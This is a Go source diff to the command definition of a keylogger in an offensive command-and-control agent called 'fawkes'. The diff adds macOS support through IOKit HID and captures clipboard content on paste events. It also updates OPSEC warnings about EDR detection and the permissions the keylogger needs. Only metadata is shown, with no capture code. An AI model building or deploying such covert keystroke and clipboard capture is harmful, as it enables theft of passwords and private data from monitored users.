@@ -18,15 +18,15 @@ var windowSectionRegex = regexp.MustCompile(`\[(\d{2}:\d{2}:\d{2})\] --- (.+?) -
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "keylog",
-		Description:         "Start, stop, or dump a low-level keyboard logger. Windows: SetWindowsHookEx. Linux: /dev/input evdev (T1056.001).",
+		Description:         "Start, stop, or dump a low-level keyboard logger. Windows: SetWindowsHookEx. Linux: /dev/input evdev. macOS: IOKit HID. Detects Ctrl+V/Cmd+V paste events and captures clipboard content (T1056.001).",
 		HelpString:          "keylog -action <start|stop|dump|status|clear>",
-		Version:             3,
+		Version:             4,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1056.001"},
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
-			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
+			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
@@ -52,7 +52,7 @@ func init() {
 					TaskID:             taskData.Task.ID,
 					Success:            true,
 					OpsecPreBlocked:    false,
-					OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Keylogger %s. Captures keystrokes via low-level input hooks (SetWindowsHookEx/WH_KEYBOARD_LL on Windows, /dev/input on Linux). EDR products actively monitor for keyboard hook installation. On Linux, requires read access to /dev/input devices.", action),
+					OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Keylogger %s. Captures keystrokes via low-level input hooks (SetWindowsHookEx on Windows, /dev/input on Linux, IOKit HID on macOS). Ctrl+V/Cmd+V paste events trigger clipboard capture. EDR products actively monitor keyboard hooks. Linux requires root/input group. macOS requires Accessibility permissions.", action),
 					OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 				}
 			},
@@ -92,7 +92,7 @@ func init() {
 			action, _ := taskData.Args.GetStringArg("action")
 			display := fmt.Sprintf("%s", action)
 			response.DisplayParams = &display
-			createArtifact(taskData.Task.ID, "API Call", "Keystroke capture (SetWindowsHookEx or /dev/input)")
+			createArtifact(taskData.Task.ID, "API Call", "Keystroke capture with clipboard paste detection (SetWindowsHookEx/dev/input/IOKit HID)")
 			return response
 		},
 		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
